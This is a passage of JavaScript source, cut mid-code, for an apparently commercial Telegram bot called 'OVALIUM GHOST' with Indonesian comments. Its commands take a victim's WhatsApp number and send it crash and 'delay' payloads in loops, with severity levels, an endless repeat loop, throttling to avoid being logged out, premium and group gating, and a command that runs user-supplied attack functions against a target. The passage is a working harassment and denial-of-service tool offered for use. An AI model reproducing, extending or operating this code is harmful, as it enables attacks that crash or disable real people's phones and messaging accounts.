  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: FORCLOSE INVISIBLE
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await Xflower(sock, target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: FORCLOSE ANDROID RELOG
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("crashandroid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }

  if (!isCmdEnabled("crashandroid")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
  // Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
if (!tokenValidated) {
        return;
    }
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashandroid 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: FORCLOSE ANDROID
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await ZInvisF(target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: FORCLOSE ANDROID
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("spamxbug", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }

  if (!isCmdEnabled("spamxbug")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
  // ======================
  // 🔐 ACCESS CONTROL
  // ======================
  if (ctx.from.id == ownerID) {
    // Owner bypass
  } else {
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Akses ditolak. Hanya tersedia di grup yang diizinkan.");
    }
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
      return ctx.reply("❌ Grup ini tidak memiliki izin akses.");
    }
  }
  
  if (!tokenValidated) {
    return;
  }
  
  // ======================
  // 📥 PARAMETER VALIDATION
  // ======================
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("📋 Format: <code>/spamxbug 62×××</code>", { parse_mode: "HTML" });
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // ======================
  // 📊 LOGGING SYSTEM
  // ======================
  const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
   
  const commandUsed = ctx.message.text;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const groupId = ctx.chat.type !== "private" ? ctx.chat.id : "-";
  const groupName = ctx.chat.type !== "private" ? ctx.chat.title : "-";

  await ctx.telegram.sendMessage(
    ownerID,
    `**FORCLOSE SPAM INITIATED**

**Executor:** ${userTag}
**User ID:** \`${userId}\`
**Command:** \`${commandUsed}\`
**Time:** ${now}
**Group:** ${groupName} (\`${groupId}\`)

**Target:** \`${q}\`
**Type:** Android Force Close
**Status:** Protocol Activated`,
    { parse_mode: "Markdown" }
  );

  // ======================
  // 🚀 INITIALIZATION MESSAGE
  // ======================
  const processMsg = await ctx.reply(
    `\`\`\`
OVALIUM GHOST
===============================
TARGET    : ${q}
TYPE      : Android Force Close
STATUS    : Initializing...
\`\`\``,
    { parse_mode: "Markdown" }
  );

  // ======================
  // 🔄 EXECUTION PROCESS
  // ======================
  for (let i = 0; i < 15; i++) {
    await croserds(sock, target);
  }

  // ======================
  // ✅ COMPLETION MESSAGE
  // ======================
  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMsg.message_id,
    undefined,
    `\`\`\`
OVALIUM GHOST
===============================
TARGET    : ${q}
TYPE      : Android Force Close
STATUS    : Completed
RESULT    : Successful
\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.command("travasdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  // Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
if (!tokenValidated) {
        return;
    }
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /travasdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: DELAY MAMPUS
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await Carouselsock(sock, target); 
    await sleep(1000);   
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: HARD DELAY
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("applecrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }

  if (!isCmdEnabled("applecrash")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
  // Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
if (!tokenValidated) {
        return;
    }
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /applecrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
 

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Iphone Crash
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

   await AllFunctionIos(sock, target);
   await antiSpamDelay();

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡l
⌑ Target: ${q}
⌑ Type: Invisible Iphone Crash
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delaynet",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    // Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
    if (!menuEnabled) {
      return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
    }
    if (!tokenValidated) {
      return;
    }

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Format: /delaynet 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
    
    await ctx.telegram.sendMessage(
      ownerID,
      `📢 <b>COMMAND DIJALANKAN</b>

👤 <b>User :</b> ${userTag}
🆔 <b>User ID :</b> <code>${userId}</code>

💬 <b>Command :</b> <code>${commandUsed}</code>
⏱️ <b>Waktu :</b> ${now}

🏠 <b>ID Grup :</b> <code>${groupId}</code>
📛 <b>Nama Grup :</b> ${groupName}
`,
      { parse_mode: "HTML" }
    );

    const sendBugProcess = async () => {
      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: `
<blockquote><pre>⬡═―—⊱ OVALIUM GHOST ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Hard
⌑ Status: Process</pre></blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek Target", url: `https://wa.me/${q}` }],
            ],
          },
        }
      );

      const processMessageId = processMessage.message_id;

      for (let i = 0; i < 20; i++) {
      await MediaInvis(target);
    await MediaInvis(target);
    await xparams(target);
    await xparams(target);
    await sleep(10000);
        await xparams(target);
        await sleep(3000);
        await xparams(target);
        await sleep(3000);
        await xparams(target);
        await sleep(3000);
        await xparams(target);
        await sleep(3000);
        await xparams(target);
        await sleep(3000);
        await MediaInvis(target);
        await sleep(3000);
        await MediaInvis(target);
        await sleep(3000);
        await xparams(target);
        await sleep(3000);
        await MediaInvis(target);
        await sleep(3000);
        await xparams(target);
        await sleep(3000);
        await MediaInvis(target);
        await sleep(3000);
        await new Promise((resolve) => setTimeout(resolve, 4500));
      }
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        processMessageId,
        undefined,
        `
<blockquote><pre>⬡═―—⊱ OVALIUM GHOST ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Hard
⌑ Status: ✅ Selesai</pre></blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ Cek Target", url: `https://wa.me/${q}` }],
            ],
          },
        }
      );
    };
    while (true) {
      await sendBugProcess();
      console.log("⏳ Tunggu 2 menit Untuk Melanjutkan.");
      await ctx.reply("⏳ Tunggu 2 menit sebelum bug berikutnya dimulai...");
      await sleep(120000);
    }
  }
);

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
if (!tokenValidated) {
        return;
    }
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command("xlevel",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,

  async (ctx) => {
    // Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
  if (!tokenValidated) {
        return;
    }
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Format: /xlevel 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithPhoto("https://files.catbox.moe/d85aqd.jpg", {
      caption: `\`\`\`
⬡═―—⊱ OVALIUM GHOST ⊰―—═⬡
⌑ Target: ${q}
⌑ Pilih tipe bug:
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "DELAY HARD INVISIBLE", callback_data: `xlevel_type_delay_${q}` },
            { text: "Blank Device", callback_data: `xlevel_type_blank_${q}` },
          ],
          [
            { text: "iPhone Crash", callback_data: `xlevel_type_ios_${q}` },
          ]
        ]
      }
    });
  }
);

// Handler semua callback
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  if (!data.startsWith("xlevel_")) return;

  const parts = data.split("_");
  const action = parts[1]; // type / level
  const type = parts[2];
  const q = parts[3];
  const level = parts[4];
  const target = q + "@s.whatsapp.net";
  const chatId = ctx.chat.id;
  const messageId = ctx.callbackQuery.message.message_id;

  // === Tahap 1: pilih tipe → tampilkan pilihan level ===
  if (action === "type") {
    return ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `\`\`\`
⬡═―—⊱ OVALIUM GHOST ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Pilih level bug:
 \`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "(Low)", callback_data: `xlevel_level_${type}_${q}_low` },
              { text: "(Medium)", callback_data: `xlevel_level_${type}_${q}_medium` },
            ],
            [
              { text: "(Hard)", callback_data: `xlevel_level_${type}_${q}_hard` },
            ],
            [
              { text: "⬅️ Kembali", callback_data: `xlevel_back_${q}` }
            ]
          ]
        }
      }
    );
  }

  // === Tombol kembali ke pilihan awal ===
  if (action === "back") {
    return ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `\`\`\`
⬡═―—⊱ OVALIUM GHOST ⊰―—═⬡
⌑ Target: ${q}
⌑ Pilih type bug:
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "DELAY HARD INVISIBLE", callback_data: `xlevel_type_delay_${q}` },
              { text: "Blank Device", callback_data: `xlevel_type_blank_${q}` },
            ],
            [
              { text: "iPhone Crash", callback_data: `xlevel_type_ios_${q}` },
            ]
          ]
        }
      }
    );
  }

  // === Tahap 2: pilih level → mulai animasi & eksekusi bug ===
  if (action === "level") {
    await ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `\`\`\`
⬡═―—⊱ OVALIUM GHOST ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ⏳ Processing
\`\`\``,
      { parse_mode: "Markdown" }
    );

    const frames = [
      "▰▱▱▱▱▱▱▱▱▱ 10%",
      "▰▰▱▱▱▱▱▱▱▱ 20%",
      "▰▰▰▱▱▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱▱▱ 40%",
      "▰▰▰▰▰▱▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱▱▱ 60%",
      "▰▰▰▰▰▰▰▱▱▱ 70%",
      "▰▰▰▰▰▰▰▰▱▱ 80%",
      "▰▰▰▰▰▰▰▰▰▱ 90%",
      "▰▰▰▰▰▰▰▰▰▰ 100%"
    ];

    for (const f of frames) {
      await ctx.telegram.editMessageCaption(
        chatId,
        messageId,
        undefined,
        `\`\`\`
⬡═―—⊱ OVALIUM GHOST ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ${f}
\`\`\``,
        { parse_mode: "Markdown" }
      );
      await new Promise((r) => setTimeout(r, 400));
    }

    // === Eksekusi sesuai type & level ===
    if (type === "blank") {
      const count = level === "low" ? 50 : level === "medium" ? 80 : 150;
      for (let i = 0; i < count; i++) {        
        await UIMention(sock, target, mention = true);
        await sleep(800);
      }
    } else if (type === "delay") {
      const loops = level === "low" ? 4 : level === "medium" ? 7 : 15;
      for (let i = 0; i < loops; i++) {
        await LittleFunnyMURBUG(target);
        await sleep(400);
      }
    } else if (type === "ios") {
      const count = level === "low" ? 20 : level === "medium" ? 50 : 100;
      for (let i = 0; i < count; i++) {
        await PermenIphone(target, mention);
        await sleep(300);
        await PermenIphone(target, mention);
        await sleep(700);
      }
    }

    // === Setelah selesai ===
    await ctx.telegram.editMessageCaption(
      chatId,
      messageId,
      undefined,
      `\`\`\`
⬡═―—⊱ OVALIUM GHOST ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: ${type.toUpperCase()}
⌑ Level: ${level.toUpperCase()}
⌑ Status: ✅ Sukses
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ Cek Target", url: `https://wa.me/${q}` }],
            [{ text: "🔁 Kirim Lagi", callback_data: `xlevel_type_${type}_${q}` }]
          ],
        },
      }
    );

    await ctx.answerCbQuery(`Bug ${type.toUpperCase()} (${level.toUpperCase()}) selesai ✅`);
  }
});


/// BATAS 
async function websiteapi(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 500;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 1000) {
    await XArrayDelay(target);
    await antiSpamDelay(); 
    await XArrayDelay(target);
    await OtaxAyunBelovedX(sock, target);
    await MediaInvis(target);    
    await xparams(target);
    await Ghostluc(target);
    await Ghostluc(target);
    await Ghostluc(target);
    await Ghostluc(target);
    await Ghostluc(target);
    await xparams(target);
    await MediaInvis(target);
    await Ghostluc(target);
    await MediaInvis(target);
    await xparams(target);
    await xparams(target);
    await MediaInvis(target);
    await MediaInvis(target);
    await xparams(target);
    await MediaInvis(target);
    await xparams(target);
    await antiSpamDelay(); 
    await sleep(8500);
    await new Promise((resolve) => setTimeout(resolve, 1000));
      
        console.log(
          chalk.red(`SUCCES SEND DELAY BRUTAL ${count}/1000 ${target}`)
        );
        count++;
        setTimeout(sendNext, 500);
      } else {
        console.log(chalk.green(`✅ Success Sending 1000 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 500 Messages"));
        setTimeout(sendNext, 150);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

//ANTI LOG OUT DELAY

let spamCooldown = false;
let spamCount = 0;
let hardLock = false;
let lastAction = Date.now();
const delay = (ms) => new Promise(r => setTimeout(r, ms));
async function antiSpamDelay(ms = 1200) {
  const now = Date.now();
  if (hardLock) {
    await delay(ms * 2.5);
    return;
  }
  const diff = now - lastAction;
  lastAction = now;
  if (diff < ms) spamCount++;
  else spamCount = 0;
  if (spamCooldown) {
    await delay(ms + spamCount * 200);
  }
  spamCooldown = true;
  setTimeout(() => (spamCooldown = false), ms);
  if (spamCount >= 5) {
    hardLock = true;
    setTimeout(() => {
      hardLock = false;
      spamCount = 0;
    }, ms * 6); 
  }
}

async function AllFunctionCrash(sock, target) {
  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
   for (let i = 0; i < 1; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`);
    await payNulL(target, true);
    const jeda = 3000; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}

async function AllFunctionCrash2(sock, target) {
  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
   for (let i = 0; i < 1; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`);
    await crashViewOnce(sock, target, true);
    const jeda = 3000; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}
async function AllFunctionDelaymek(sock, target) {
  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
  for (let i = 0; i < 10; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`);    
    await delayExecution(sock, target);
    await Epcx(sock, target);
    await TrueNullV7(sock, target);    
    await antiSpamDelay();    
    const jeda = 1500; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}


async function AllFunctionDelayv2(sock, target) {
  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
  for (let i = 0; i < 10; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`);    
    await LittleFunnyMURBUG(target);
    await audiodelay(sock, target);      
    await delayExecution(sock, target);
    await Epcx(sock, target);
    await TrueNullV7(sock, target);
    await TrueNull(sock, target); 
    await antiSpamDelay();    
    const jeda = 500; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}

async function AllFunctionDelaybull(sock, target) {
  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
  for (let i = 0; i < 20; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`);
    await Invisbull(sock, target);    
    await antiSpamDelay();    
    const jeda = 3000; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}

async function AllFunctionDelayduration(sock, target) {
  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
  for (let i = 0; i < 10; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`); 
    await tickDelay(sock, target); 
    await audiodelay(sock, target);
    await delayExecution(sock, target);
    await audiodelay(sock, target);
    await Epcx(sock, target);
    await TrueNullV7(sock, target);
    await VoiceInvisible(sock, target);
    await XArrayDelay(target);
    await xinvis(sock, target); 
    await antiSpamDelay();    
    const jeda = 1000; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}

async function AllFunctionDelayV3(sock, target) {
  function sleep(ms) {
